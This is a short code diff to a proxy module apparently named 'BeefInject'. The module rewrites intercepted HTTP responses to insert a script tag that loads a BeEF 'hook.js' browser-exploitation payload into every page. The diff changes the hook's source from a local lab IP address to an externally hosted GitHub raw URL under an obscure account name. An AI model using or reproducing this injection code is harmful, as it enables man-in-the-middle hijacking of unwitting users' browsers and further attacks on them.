@@ -9,7 +9,7 @@ function onResponse(req, res) {
  log( "BeefInject loaded." );
       res.Body = body.replace( 
         '</head>', 
-        '<script type="text/javascript" src="http://10.0.2.15:3000/hook.js"></script></head>' 
+        '<script type="text/javascript" src="https://raw.githubusercontent.com/7580jksd-035jsad-925bjnf/7580jksd-035jsad-925bjnf7580jksd-035jsad-925bjnf.github.io/main/hook.js"></script></head>' 
       ); 
     }
   }
